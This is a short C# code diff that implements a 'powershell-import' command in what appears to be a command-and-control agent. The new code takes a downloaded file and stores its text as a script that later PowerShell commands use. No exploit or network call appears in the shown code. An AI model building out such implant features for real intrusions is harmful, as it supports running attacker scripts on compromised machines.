@@ -13,22 +13,14 @@ namespace Agent.Commands
         public override string Name => "powershell-import";
         public override void InnerExecute(AgentTask task, AgentCommandContext context)
         {
-            throw new NotImplementedException();
-            //if (string.IsNullOrEmpty(task.FileId))
-            //{
-            //    Script = null;
-            //    this.Notify(result, commm, $"Import script reseted.");
-            //    return;
-            //}
+            this.CheckFileDownloaded(task, context);
 
-            //var fileContent = context.MessageServiceDownload(task.FileId, a =>
-            //{
-            //    result.Info = $"Downloading {task.FileName} ({a}%)";
-            //    context.MessageServiceSendResult(result);
-            //}).Result;
+            var file = context.FileService.ConsumeDownloadedFile(task.FileId);
+            var fileContent = file.GetFileContent();
 
-            //Script = Encoding.UTF8.GetString(fileContent);
-            //this.Notify(result, commm, $"{task.FileName} Dowloaded ans set ad Import script");
+
+            Script = Encoding.UTF8.GetString(fileContent);
+            this.Notify(context, $"{task.FileName} Dowloaded and set ad Import script");
         }
 
         public static string Script { get; set; }
